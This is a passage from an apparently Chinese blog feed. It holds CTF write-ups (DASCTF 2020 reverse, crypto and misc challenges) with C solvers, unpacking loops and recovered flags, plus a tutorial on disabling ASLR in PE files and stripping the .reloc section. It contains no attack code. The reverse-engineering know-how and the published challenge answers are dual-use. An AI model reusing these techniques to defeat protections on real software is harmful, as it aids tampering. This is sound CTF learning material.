class="number">128</span>;</span><br><span class="line">A.a[j] = A.a[j]*j;</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">A.a[++j] /= <span class="number">10</span>;</span><br><span class="line">--i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">--j;</span><br><span class="line">--i;</span><br><span class="line">A.a[j] = decode_4(A.a[j]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">A.a[j] = A.a[j];</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">A.a[j--] *= <span class="number">10</span>;</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">A.a[j] -= <span class="number">128</span>;</span><br><span class="line">A.a[j] = ~A.a[j];</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">--i;</span><br><span class="line">--j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">A.a[j] /= <span class="number">4</span>;</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">--i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">37</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">d[c[i]<span class="number">-1</span>] = A.a[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">37</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">e[b[i]<span class="number">-1</span>] = d[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">4</span>; i &lt;= <span class="number">19</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">temp = e[i];</span><br><span class="line">e[i] = e[i+<span class="number">16</span>];</span><br><span class="line">e[i+<span class="number">16</span>] = temp;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">37</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, e[i]); </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524083340342.png" alt="image-20200524083340342"></p><hr><h3 id="BScript"><a href="#BScript" class="headerlink" title="BScript"></a>BScript</h3><p>感觉有点意思。主要就是考对文件内容的提取，还有就是找规律!!!</p><p>下载下来803个exe文件。随便打开一个看见简单的输入对比, 再打开一个还是同样的.但没有发现与解题相关的东西。</p><p>也是后面想着再去看看这个题才发现 每个exe文件让我们输入的都是一个PE文件的一部分, 那 熟悉的 MZ(4D5A)。<img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524100310951.png" alt="image-20200524100310951"></p><p>接下来就是去文件内容了。但是每个程序都是加了upx壳的。</p><p>然后用C语言写了脱壳：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">83</span>; i &lt; <span class="number">804</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(a, <span class="string">"upx -d %d.exe"</span>, i);</span><br><span class="line">system(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524102949962.png" alt="image-20200524102949962"></p><p>下面提取每个程序的 PE文件那部分的内容. 弄完, 保存为exe文件后, 打不开…ida都不行, 看看了PE文件内容发现区段都没有。。</p><p>那就提取的内容有问题, 多看了几个原来的exe文件， 果然，有的提取内容的位置不一样。</p><p>但有803个exe。</p><p>开始找规律。列举了很多还是没发现。这也是本题花费时间最多的地方……..根据exe文件的字节大小来区分…改了一下提取内容的程序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, n = <span class="number">779</span>, j = <span class="number">0</span>, lenth = <span class="number">0</span>; </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[<span class="number">4000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">char</span> filename[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(filename, <span class="string">"%d.exe"</span>, j++);</span><br><span class="line">fp = fopen(filename, <span class="string">"rb"</span>);</span><br><span class="line">fseek(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line">lenth = ftell(fp);</span><br><span class="line"><span class="keyword">if</span>(lenth == <span class="number">0xBDF1</span>)</span><br><span class="line">&#123;</span><br><span class="line">fseek(fp, <span class="number">0x1c20</span>, <span class="number">0</span>);</span><br><span class="line">fread(a, <span class="number">1</span>, <span class="number">0x20</span>, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02X"</span>, a[i]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">fseek(fp, <span class="number">0x1C40</span>, <span class="number">0</span>);</span><br><span class="line">fread(a, <span class="number">1</span>, <span class="number">0x40</span>, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">63</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02X"</span>, a[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仍然打不开，但是这次区段都是齐的, ida可以打开就好了。</p><p>载入ida，发现有很多干扰项，但可以在比较函数上面一个看出是 base64加密。最后与密文比较：</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524101529508.png" alt="image-20200524101529508"></p><p>找密文， 可以发现是程序运行才赋值的。</p><p><img src="/2020/05/23/2020%E5%B9%B4DASCTF%E4%BA%94%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200524101634787.png" alt="image-20200524101634787"></p><p>提取出来base解密一下，再md5得到flag. <strong>e801bcbcc42d3120d910ccc46ae640dd</strong></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="bbcrypto"><a href="#bbcrypto" class="headerlink" title="bbcrypto"></a>bbcrypto</h3><p>由于python接触的很少，做了一个密码学的感觉像是在学python。不断查语法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> A,SALT</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(m, a, si)</span>:</span></span><br><span class="line"></span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(m)):</span><br><span class="line"></span><br><span class="line">        c+=hex(((ord(m[i])) * a + ord(next(si))) % <span class="number">128</span>)[<span class="number">2</span>:].zfill(<span class="number">2</span>)  <span class="comment">#不足2位以0填充。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    m = <span class="string">'flag&#123;********************************&#125;'</span></span><br><span class="line"></span><br><span class="line">    a = A</span><br><span class="line"></span><br><span class="line">    salt = SALT</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span>(len(salt)==<span class="number">3</span>) <span class="comment">#assert相当于一个判断表达式，若括号中表达式不成立则退出。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span>(salt.isalpha()) <span class="comment">#检查是否是字母</span></span><br><span class="line"></span><br><span class="line">    si = cycle(salt.lower()) <span class="comment">#cycle把字符串salt变成一个循环，相当于 si[i++%3];</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"明文内容为："</span>)</span><br><span class="line"></span><br><span class="line">    print(m)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"加密后的密文为："</span>)</span><br><span class="line"></span><br><span class="line">    c=encrypt(m, a, si)</span><br><span class="line"></span><br><span class="line">    print(c)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#加密后的密文为：</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d</span></span><br></pre></td></tr></table></figure><p>从题中可以看到，A与salt未知，但是salt给出了限制，必须字母且3位。</p><p>又知道flag的格式 <strong>flag{ }</strong>，那结合密文与加密表达式，直接列方程加爆破解出未知量即可。</p><p>记得当时解出 A  = 57. si = “ahh” 开始解密。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d"</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, lenth = <span class="built_in">strlen</span>(a), sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> b[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> c[<span class="number">3</span>] = &#123;<span class="number">97</span>, <span class="number">104</span>, <span class="number">104</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i] &gt;= <span class="number">97</span> &amp;&amp; a[i] &lt;= <span class="number">122</span>)</span><br><span class="line">a[i] -= <span class="number">87</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a[i] &gt;= <span class="number">65</span> &amp;&amp; a[i] &lt;=  <span class="number">90</span>) </span><br><span class="line">a[i] -= <span class="number">55</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i] -= <span class="number">48</span>; </span><br><span class="line"></span><br><span class="line">sum = sum*<span class="number">16</span> + a[i];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a[i+<span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i+<span class="number">1</span>] &gt;= <span class="number">97</span> &amp;&amp; a[i+<span class="number">1</span>] &lt;= <span class="number">122</span>)</span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">87</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a[i+<span class="number">1</span>] &gt;= <span class="number">65</span> &amp;&amp; a[i+<span class="number">1</span>] &lt;=  <span class="number">90</span>) </span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">55</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">48</span>;</span><br><span class="line"></span><br><span class="line">sum = sum*<span class="number">16</span> + a[i+<span class="number">1</span>]; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">b[j++] = sum, sum = <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">38</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">33</span>; i &lt; <span class="number">127</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((i*<span class="number">57</span> + c[j%<span class="number">3</span>])%<span class="number">128</span> == b[j])</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, i); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>flag: flag{ad7d973ffdd285b476a1a727b3a8fbc4}</strong></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Questionaire"><a href="#Questionaire" class="headerlink" title="Questionaire"></a>Questionaire</h3><p>开始网站始终打不开，因为没接触过web，始终认为是考web的知识。</p><p>后面想着挂vpn试试。打开了，很多刁难性问题，直接查看网页源代码，找到对应答案即可。</p><h3 id="bin-cat-2"><a href="#bin-cat-2" class="headerlink" title="/bin/cat 2"></a>/bin/cat 2</h3><p>得到一张 gif 图片， 还是老办法放在 stegesolve 工具中看看。</p><p>开始看了好几圈也没看出什么名堂，也是很久了，在red plane的页面发现很像一个二维码，带着试一试用工具截取了下来。</p><p>使用 PsQREdit 2.4.3 真的得到了 flag.  具体题没有保留下来。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ASLR</title>
      <link href="/2020/05/12/ASLR/"/>
      <url>/2020/05/12/ASLR/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>开始是一道CTF题加了UPX壳,  利用堆栈平衡脱壳,import rec进行IAT修复后,程序不能正常打开了.  后来才知道是开启了ASLR, 关闭后即可打开。 加壳会对PE文件的重定位表进行压缩,在OD直接dump出的程序是丢失重定位表的, 而程序又是开启了ASLR,那程序自然会访问到无效的地址而打不开</strong></p></blockquote><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>ASLR(地址空间布局随机化), 一种针对缓冲区溢出的安全保护技术. 从Windows Vsita(内核版本<strong>6.0</strong>)开始采用, 而Windows XP的内核版本是<strong>5.1</strong>, 所以我们在Windows XP下脱开启了ASLR 的壳是不会有这个问题的.</p><p>ASLR就是使我们的PE文件在每次载入内存时起始地址都会变得随机化, 增加恶意用户编写漏洞利用代码的难度(<strong>在之前我们知道只有dll文件在理想地址空间被占用了才会进行重定位</strong>)</p><p>对于ASLR功能我们系统(win10)是默认关闭的, 我们可以在设置的安全中心打开.<img src="/2020/05/12/ASLR/image-20200511184233641-1589256958059.png" alt="image-20200511184233641"></p><p>另外就是可执行文件的ASLR, 我们在我们的编译器上也可以选择是否引用该功能.<img src="/2020/05/12/ASLR/image-20200511185012962-1589256958060.png" alt="image-20200511185012962"></p><h2 id="分析ASLR"><a href="#分析ASLR" class="headerlink" title="分析ASLR"></a>分析ASLR</h2><p>以VS编译器写一个程序, 分别生成开启了随机基址与未开启的的版本来分析. (<strong>一共有三个地方不同</strong>)</p><p><strong>(1)</strong>未开启ASLR的程序的<strong>文件头的Characteristics</strong>会多一个 <strong>IMAGE_FILE_RELOCS_STRIPPED   0X0001</strong> 的属性, 经过查看官方文档可以看得到属性解释, 所以我们开启ASLRd的程序不会有这个属性<img src="/2020/05/12/ASLR/image-20200511200244008-1589256958060.png" alt="image-20200511200244008"></p><p>​    下面看程序对比:</p><p><img src="/2020/05/12/ASLR/image-20200511201513817-1589256958060.png" alt="image-20200511201513817"></p><p><strong>(2)</strong>开启了ASLR的程序的<strong>可选头的DllCharacteristics</strong>多了<strong>IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE</strong></p><p><strong>0X0040</strong>的属性. 同样查看官方文档. 即重定位时需要的属性.<img src="/2020/05/12/ASLR/image-20200511201801401-1589256958060.png" alt="image-20200511201801401"></p><p>程序对比:<img src="/2020/05/12/ASLR/image-20200511202308748-1589204427416-1589204437657-1589256958060.png" alt="image-20200511202308748"></p><p><strong>(3)</strong>开启了ASLR的程序会多一个 <strong>.reloc</strong> 节(一般普通的exe文件是不需要该节的, 用于开启ASLR的程序进行重定位, 当然我们关闭了ASLR也可以把这个节删了)<img src="/2020/05/12/ASLR/image-20200511202858464-1589256958060.png" alt="image-20200511202858464"></p><h2 id="关闭ASLR"><a href="#关闭ASLR" class="headerlink" title="关闭ASLR"></a>关闭ASLR</h2><p>由上面的分析知道有3处不同, 其中上面的<strong>(1)</strong>中是开启了ASLR的程序少了 <strong>IMAGE_FILE_RELOCS_STRIPPED   0X0001</strong>属性, 我们增加上这个属性即可关闭ASLR(即 <strong>0102 -&gt; 0103</strong> / <strong>对应属性打上勾即可</strong>).    另外<strong>(2)</strong>中是多了<strong>DLL can move</strong>的属性,删除这个属性,同样可以关闭ASLR(即 <strong>8140 -&gt; 8100</strong> / <strong>对应属性取消打勾即可</strong> )</p><p>下面示例在010编译器中修改数值来关闭ASLR.<img src="/2020/05/12/ASLR/image-20200511204613644-1589256958060.png" alt="image-20200511204613644"></p><blockquote><p><strong>以上是关于ASLR的分析即关闭, 如果开启了ASLR, 我们在脱壳之前还是先关闭它最好,也方便调试时IDA与OD中地址的对应(如果只是想地址对应, 也可以在IDA中启动时把Manual load勾上, 手动输入加载的基地址即可),  既然关闭了ASLR, 那多出的.reloc节也就没用了, 下面手动删除该节区(虽然有很多工具可以直接实现, 还是手动熟悉下PE结构)</strong></p></blockquote><h2 id="删除-reloc节区"><a href="#删除-reloc节区" class="headerlink" title="删除.reloc节区"></a>删除.reloc节区</h2><p>首先每个节都对应一个节区头的, 那先从节区头开始. 使用010editor可以轻松在最后一节区头找到.  我们将其全部用0覆盖填充即可.(注: 不能直接删除了, 不然PE文件的很多属性会对应不上)<img src="/2020/05/12/ASLR/image-20200511205903649-1589256958060.png" alt="image-20200511205903649"></p><p>下面删除.reloc整个节区(一般这个节区都是新加的,所以在最后, 我们只要找到偏移地址直接删除到最后即可), 如图, 直接删除到最后即可. (这里的Size: 600h, 下面有用)<img src="/2020/05/12/ASLR/image-20200511210742225-1589256958060.png" alt="image-20200511210742225"></p><p>删除完后, 我们知道PE文件头的<strong>_IMAGE_FILE_HEADER</strong>的<strong>NumberOfSections</strong>的值一定要严格的与实际节区对应, 所以去修改 <strong>_IMAGE_FILE_HEADER</strong>的<strong>NumberOfSections</strong>使其减一.<img src="/2020/05/12/ASLR/image-20200511210943674-1589256958060.png" alt="image-20200511210943674">)<img src="/2020/05/12/ASLR/image-20200511211434269-1589256958060.png" alt="image-20200511211434269"></p><p>最后还有修改一个属性, 就是PE文件头 <strong>_IMAGE_OPTIONAL_HEADER</strong></p><p>的<strong>SizeOfImage</strong>, 修改为减去 .reloc节区后的大小  从上面我们知道.reloc大小是600h, 而该PE文件<strong>SectionAlignment(节在内存中的最小单位 (对齐单位) 一般为: 1000h)为1000h</strong>, 1000h &gt; 600h. 以1000h对齐, 所以我们直接将<strong>SizeOfImage</strong>减去1000h即可.<img src="/2020/05/12/ASLR/image-20200511211537176-1589256958060.png" alt="image-20200511211537176">)<img src="/2020/05/12/ASLR/image-20200511212159056-1589256958060.png" alt="image-20200511212159056"></p><blockquote><p>如果想增加一个节区, 也可以使用同样的方法</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020年DASCTF四月线上赛</title>
      <link href="/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
      <url>/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>第一次参加比赛，做出题很开心了~<a id="more"></a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Bluetooth"><a href="#Bluetooth" class="headerlink" title="Bluetooth"></a>Bluetooth</h3><p>下载下来是一个流量包，题目也没有提示，就先用binwalk看能不能提取出什么。直接 <strong>binwalk -e</strong>，什么也没有。</p><p>但是我们往下看一下，是有个压缩包。那就手动提取吧<strong>dd if=3.pcapng bs=1 skip=24437 of=3.zip</strong> </p><p><img src="/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200425202118617-1590546897888.png" alt="image-20200425202118617"></p><p>这次，文件所在目录出现了一个压缩包，尝试打开但是有密码，但是我们可以看到它提示信息：</p><p><img src="/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200425202435440-1590546907450.png" alt="image-20200425202435440"></p><p>说密码蓝牙的pin，我也是刚刚接触这个wireshare这个软件，百度了一下，就是我们连接蓝牙时的那个数字。但是我是不知道怎么找这个东西，就百度怎么用wireshark抓蓝牙的包，但没有的得到有用消息，有的还要什么蓝牙驱动。就自己去搜索bluetooth，找了一圈也没有得到那个pin。我就又跑去打暴力破解的打算，但又没有7z压缩包暴力破解密码的工具，又去各大论坛找，找到了但没用😂。暂时放下了这个题，去做reverse, reverse的2个题做的还比较顺利。回来继续看这个题，这次干脆直接搜 pin 试试，出现 PIN请求，PIN请求回应，PIN请求回应完成。</p><p><img src="/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200425203534918-1590546913901.png" alt="image-20200425203534918"></p><p>那么这PIN请求回应的可能性就最大了，点进去：可以看到 PIN Code : 141854</p><p><img src="/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200425203900340-1590546919828.png" alt="image-20200425203900340"></p><p>最后输入压缩包得到flag。</p><p><img src="/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200425204118569-1590546940841.png" alt="image-20200425204118569"></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h3><p>题目下载后，用ida打开，找到主函数，逻辑上很清晰，说是将flag与我们输入的数字混合在了一起。程序就做了将我们输入的数字与已经编码了的一些数据进行异或运算然后输出的操作。</p><p><img src="/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200426191831676-1590546936568.png" alt="image-20200426191831676"></p><p>开始想的是会不会直接就是已经编码的数据，看了看ASCII，不可能是。</p><p>那有可能就是将我们输入的数据与编码的数据进行或运算后输出的是flag。那么按照flag的格式，根据题目说 最后的flag输入的是 flag{}/DACTF{}中的数据，那么这里的flag也就是这2种格式了。</p><p>这样就好办了，他们末尾都是 <strong>}</strong> 我们把编码数据的最后一位 61，找到一个数字与它异或运算位的值为 <strong>}</strong> 的ASCII 125，就行了。 得到64，最后把编码的所有数据与<strong>64</strong>进行一个异或运算就得到flag。</p><p><strong>但是提取数字时，我们可以直接把代码复制到编译中，但是注意，这不是数组，根据栈的特点，要倒着遍历。</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF</title>
      <link href="/2020/04/23/BUUCTF/"/>
      <url>/2020/04/23/BUUCTF/</url>
      
